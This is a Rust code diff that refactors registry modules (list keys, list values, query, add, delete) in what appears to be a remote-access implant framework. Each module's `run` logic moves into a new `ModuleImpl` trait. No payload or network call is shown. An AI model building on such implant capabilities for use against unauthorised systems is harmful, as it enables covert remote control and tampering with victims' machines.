@@ -1,4 +1,4 @@
-use crate::{check_field, check_request, Input, Module, Output, Result, TaskResult};
+use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
 use async_trait::async_trait;
 use malefic_helper::to_error;
 use malefic_helper::win::reg::{RegistryKey, RegistryValue};
@@ -9,7 +9,10 @@ pub struct RegListKey {}
 
 #[async_trait]
 #[module_impl("reg_list_key")]
-impl Module for RegListKey {
+impl Module for RegListKey {}
+
+#[async_trait]
+impl ModuleImpl for RegListKey {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryRequest)?;
         let hive = check_field!(req.hive)?;
@@ -26,7 +29,10 @@ impl Module for RegListKey {
 pub struct RegListValue {}
 #[async_trait]
 #[module_impl("reg_list_value")]
-impl Module for RegListValue {
+impl Module for RegListValue {}
+
+#[async_trait]
+impl ModuleImpl for RegListValue {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryRequest)?;
         let hive = check_field!(req.hive)?;
@@ -47,7 +53,9 @@ impl Module for RegListValue {
 pub struct RegQuery {}
 #[async_trait]
 #[module_impl("reg_query")]
-impl Module for RegQuery {
+impl Module for RegQuery {}
+#[async_trait]
+impl ModuleImpl for RegQuery {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryRequest)?;
         let hive = check_field!(req.hive)?;
@@ -66,7 +74,9 @@ impl Module for RegQuery {
 pub struct RegAdd {}
 #[async_trait]
 #[module_impl("reg_add")]
-impl Module for RegAdd {
+impl Module for RegAdd {}
+#[async_trait]
+impl ModuleImpl for RegAdd {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryWriteRequest)?;
         let hive = check_field!(req.hive)?;
@@ -111,7 +121,9 @@ pub struct RegDelete {}
 
 #[async_trait]
 #[module_impl("reg_delete")]
-impl Module for RegDelete {
+impl Module for RegDelete {}
+#[async_trait]
+impl ModuleImpl for RegDelete {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RegistryRequest)?;
         let hive = check_field!(req.hive)?;
